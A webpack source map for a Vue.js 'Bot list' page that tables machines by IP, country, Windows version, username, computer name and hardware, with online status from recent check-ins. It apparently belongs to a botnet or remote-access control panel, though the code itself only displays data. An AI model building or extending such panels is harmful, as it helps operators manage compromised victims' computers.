{"version":3,"sources":["webpack:///./src/pages/bots/bots.vue?bf60","webpack:///src/pages/bots/bots.vue","webpack:///./src/pages/bots/bots.vue?75eb","webpack:///./src/pages/bots/bots.vue"],"names":["render","_vm","this","_h","$createElement","_c","_self","directives","name","rawName","value","expression","staticStyle","staticClass","attrs","slot","_v","tableData","scopedSlots","_u","key","fn","props","_s","row","ip","country","_f","joined","isOnline","seen","staticRenderFns","component"],"mappings":"uHAAA,IAAIA,EAAS,WAAa,IAAIC,EAAIC,KAASC,EAAGF,EAAIG,eAAmBC,EAAGJ,EAAIK,MAAMD,IAAIF,EAAG,OAAOE,EAAG,SAAS,CAACE,WAAW,CAAC,CAACC,KAAK,UAAUC,QAAQ,YAAYC,MAAOT,EAAa,UAAEU,WAAW,cAAcC,YAAY,CAAC,OAAS,SAAS,CAACP,EAAG,UAAU,CAACQ,YAAY,YAAYC,MAAM,CAAC,OAAS,UAAU,CAACT,EAAG,MAAM,CAACQ,YAAY,WAAWC,MAAM,CAAC,KAAO,UAAUC,KAAK,UAAU,CAACV,EAAG,OAAO,CAACJ,EAAIe,GAAG,gBAAgBX,EAAG,WAAW,CAACS,MAAM,CAAC,KAAOb,EAAIgB,YAAY,CAACZ,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,KAAK,MAAQ,KAAK,MAAQ,QAAQT,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,MAAM,MAAQ,SAAST,EAAG,kBAAkB,CAACS,MAAM,CAAC,MAAQ,MAAMI,YAAYjB,EAAIkB,GAAG,CAAC,CAACC,IAAI,UAAUC,GAAG,SAASC,GAAO,MAAO,CAACjB,EAAG,OAAO,CAACJ,EAAIe,GAAGf,EAAIsB,GAAGD,EAAME,IAAIC,OAAOpB,EAAG,MAAMA,EAAG,OAAO,CAACJ,EAAIe,GAAGf,EAAIsB,GAAGD,EAAME,IAAIE,mBAAmBrB,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,UAAU,MAAQ,SAAST,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,WAAW,MAAQ,UAAUT,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,eAAe,MAAQ,UAAUT,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,WAAW,MAAQ,SAAST,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,WAAW,MAAQ,SAAST,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,aAAa,MAAQ,SAAST,EAAG,kBAAkB,CAACS,MAAM,CAAC,KAAO,oBAAoB,MAAQ,aAAaT,EAAG,kBAAkB,CAACS,MAAM,CAAC,MAAQ,UAAUI,YAAYjB,EAAIkB,GAAG,CAAC,CAACC,IAAI,UAAUC,GAAG,SAASC,GAAO,MAAO,CAACjB,EAAG,OAAO,CAACJ,EAAIe,GAAGf,EAAIsB,GAAGtB,EAAI0B,GAAG,UAAP1B,CAAkBqB,EAAME,IAAII,mBAAmBvB,EAAG,kBAAkB,CAACS,MAAM,CAAC,MAAQ,UAAUI,YAAYjB,EAAIkB,GAAG,CAAC,CAACC,IAAI,UAAUC,GAAG,SAASC,GAAO,MAAO,CAAErB,EAAI4B,SAASP,EAAME,IAAIM,MAAOzB,EAAG,SAAS,CAACS,MAAM,CAAC,KAAO,YAAY,CAACb,EAAIe,GAAG,YAAYX,EAAG,SAAS,CAACS,MAAM,CAAC,KAAO,WAAW,CAACb,EAAIe,GAAG,qBAAqB,IAAI,IAAI,IAChrDe,EAAkB,G,oCCyCtB,GACE,KADF,WAEI,MAAJ,CACM,WAAN,EACM,UAAN,KAGE,QAPF,WAOI,IAAJ,OAAI,OAAJ,sJACA,eADA,8CAGE,QAAF,CACI,QADJ,SACA,GACM,IAAN,8BACA,KACA,OACA,OACA,OACA,QAEM,OAAN,IACA,sBAEA,IACA,wBAEA,IACA,wBAEA,IACA,wBAEA,IACA,8BAGA,+BAIE,QAAF,CACI,SADJ,SACA,GACM,OAAN,gCAEI,WAJJ,WAIM,IAAN,OAAM,OAAN,qDAAQ,OAAR,iFACA,eADA,SAEA,qBAFA,OAEA,YAFA,OAGA,eAHA,gDCrF6V,I,YCOzVC,EAAY,eACd,EACAhC,EACA+B,GACA,EACA,KACA,KACA,MAIa,aAAAC,E","file":"js/chunk-2d21726d.9728d884.js","sourcesContent":["var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('el-row',{directives:[{name:\"loading\",rawName:\"v-loading\",value:(_vm.isLoading),expression:\"isLoading\"}],staticStyle:{\"margin\":\"20px\"}},[_c('el-card',{staticClass:\"bots-card\",attrs:{\"shadow\":\"hover\"}},[_c('div',{staticClass:\"clearfix\",attrs:{\"slot\":\"header\"},slot:\"header\"},[_c('span',[_vm._v(\"Bot list\")])]),_c('el-table',{attrs:{\"data\":_vm.tableData}},[_c('el-table-column',{attrs:{\"prop\":\"id\",\"label\":\"ID\",\"width\":\"70\"}}),_c('el-table-column',{attrs:{\"prop\":\"uid\",\"label\":\"UID\"}}),_c('el-table-column',{attrs:{\"label\":\"IP\"},scopedSlots:_vm._u([{key:\"default\",fn:function(props){return [_c('span',[_vm._v(_vm._s(props.row.ip))]),_c('br'),_c('span',[_vm._v(_vm._s(props.row.country))])]}}])}),_c('el-table-column',{attrs:{\"prop\":\"win_ver\",\"label\":\"Win\"}}),_c('el-table-column',{attrs:{\"prop\":\"username\",\"label\":\"User\"}}),_c('el-table-column',{attrs:{\"prop\":\"computername\",\"label\":\"Comp\"}}),_c('el-table-column',{attrs:{\"prop\":\"cpu_name\",\"label\":\"CPU\"}}),_c('el-table-column',{attrs:{\"prop\":\"gpu_name\",\"label\":\"GPU\"}}),_c('el-table-column',{attrs:{\"prop\":\"ram_amount\",\"label\":\"RAM\"}}),_c('el-table-column',{attrs:{\"prop\":\"screen_resolution\",\"label\":\"Display\"}}),_c('el-table-column',{attrs:{\"label\":\"Joined\"},scopedSlots:_vm._u([{key:\"default\",fn:function(props){return [_c('span',[_vm._v(_vm._s(_vm._f(\"timeago\")(props.row.joined)))])]}}])}),_c('el-table-column',{attrs:{\"label\":\"Status\"},scopedSlots:_vm._u([{key:\"default\",fn:function(props){return [(_vm.isOnline(props.row.seen))?_c('el-tag',{attrs:{\"type\":\"success\"}},[_vm._v(\"Online\")]):_c('el-tag',{attrs:{\"type\":\"danger\"}},[_vm._v(\"Offline\")])]}}])})],1)],1)],1)}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","<template>\r\n  <el-row style=\"margin: 20px;\" v-loading=\"isLoading\">\r\n    <el-card class=\"bots-card\" shadow=\"hover\">\r\n        <div slot=\"header\" class=\"clearfix\">\r\n            <span>Bot list</span>\r\n        </div>\r\n        <el-table :data=\"tableData\">\r\n            <el-table-column prop=\"id\" label=\"ID\" width=\"70\"></el-table-column>\r\n            <el-table-column prop=\"uid\" label=\"UID\"></el-table-column>\r\n            <el-table-column label=\"IP\">\r\n                <template slot-scope=\"props\">\r\n                    <span>{{props.row.ip}}</span>\r\n                    <br>\r\n                    <span>{{props.row.country}}</span>\r\n                </template>\r\n            </el-table-column>\r\n            <el-table-column prop=\"win_ver\" label=\"Win\"></el-table-column>\r\n            <el-table-column prop=\"username\" label=\"User\"></el-table-column>\r\n            <el-table-column prop=\"computername\" label=\"Comp\"></el-table-column>\r\n            <el-table-column prop=\"cpu_name\" label=\"CPU\"></el-table-column>\r\n            <el-table-column prop=\"gpu_name\" label=\"GPU\"></el-table-column>\r\n            <el-table-column prop=\"ram_amount\" label=\"RAM\"></el-table-column>\r\n            <el-table-column prop=\"screen_resolution\" label=\"Display\"></el-table-column>\r\n            <el-table-column label=\"Joined\">\r\n                <template slot-scope=\"props\">\r\n                    <span>{{props.row.joined | timeago}}</span>\r\n                </template>\r\n            </el-table-column>\r\n            <el-table-column label=\"Status\">\r\n                <template slot-scope=\"props\">\r\n                    <el-tag v-if=\"isOnline(props.row.seen)\" type=\"success\">Online</el-tag>\r\n                    <el-tag v-else type=\"danger\">Offline</el-tag>\r\n                </template>\r\n            </el-table-column>\r\n        </el-table>\r\n    </el-card>\r\n  </el-row>\r\n</template>\r\n\r\n<script>\r\nimport api from '../../api/'\r\n\r\nexport default {\r\n    data() {\r\n        return {\r\n            isLoading: false,\r\n            tableData: [],\r\n        }\r\n    },\r\n    async created() {\r\n        await this.updateData();\r\n    },\r\n    filters: {\r\n        timeago(timeStamp) {\r\n            const diff = Math.round(+new Date()/1000) - timeStamp\r\n            const msPerMinute = 60;\r\n            const msPerHour = msPerMinute * 60;\r\n            const msPerDay = msPerHour * 24;\r\n            const msPerMonth = msPerDay * 30;\r\n            const msPerYear = msPerDay * 365;\r\n\r\n            if (diff < msPerMinute) {\r\n                return Math.round(diff) + 's ago';\r\n            }\r\n            else if (diff < msPerHour) {\r\n                return Math.round(diff/msPerMinute) + 'm ago';\r\n            }\r\n            else if (diff < msPerDay) {\r\n                return Math.round(diff/msPerHour) + 'h ago';\r\n            }\r\n            else if (diff < msPerMonth) {\r\n                return Math.round(diff/msPerDay) + 'd ago';\r\n            }\r\n            else if (diff < msPerYear) {\r\n                return Math.round(diff/msPerMonth) + ' months ago';\r\n            }\r\n            else {\r\n                return Math.round(diff/msPerYear) + ' years ago';\r\n            }\r\n        }\r\n    },\r\n    methods: {\r\n        isOnline(timestamp) {\r\n            return (Math.round(+new Date()/1000) - timestamp) < 60\r\n        },\r\n        async updateData() {\r\n            this.isLoading = true;\r\n            this.tableData = await api.getBotsData();\r\n            this.isLoading = false;\r\n        },\r\n    },\r\n}\r\n</script>","import mod from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./bots.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./bots.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./bots.vue?vue&type=template&id=1ee7c6c8&\"\nimport script from \"./bots.vue?vue&type=script&lang=js&\"\nexport * from \"./bots.vue?vue&type=script&lang=js&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports"],"sourceRoot":""}